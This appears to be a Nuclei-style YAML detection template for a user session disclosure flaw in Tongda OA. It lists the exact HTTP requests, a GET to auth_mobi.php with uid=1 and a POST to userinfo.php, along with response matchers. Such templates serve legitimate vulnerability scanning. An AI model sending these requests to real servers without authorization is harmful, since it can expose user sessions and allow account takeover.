id: poc-yaml-tongda-user-session-disclosure

info:
  name: Tongda User Session Disclosure
  author: ProjectDiscoveryAI
  severity: high
  tags: info-leak
  description: |
    This template detects user session information disclosure in Tongda applications.

http:
  - method: GET
    path:
      - "/mobile/auth_mobi.php?isAvatar=1&uid=1&P_VER=0"
    matchers:
      - type: status
        status:
          - 200
      - type: word
        words:
          - "isAvatar"
        part: body

  - method: POST
    path:
      - "/general/userinfo.php?UID=1"
    matchers-condition: and
    matchers:
      - type: status
        status:
          - 200
      - type: word
        words:
          - "\"dept_name\":\""
          - "\"online_flag\":"
        part: body
      - type: word
        words:
          - "Content-Type"
          - "application/json"
        part: header
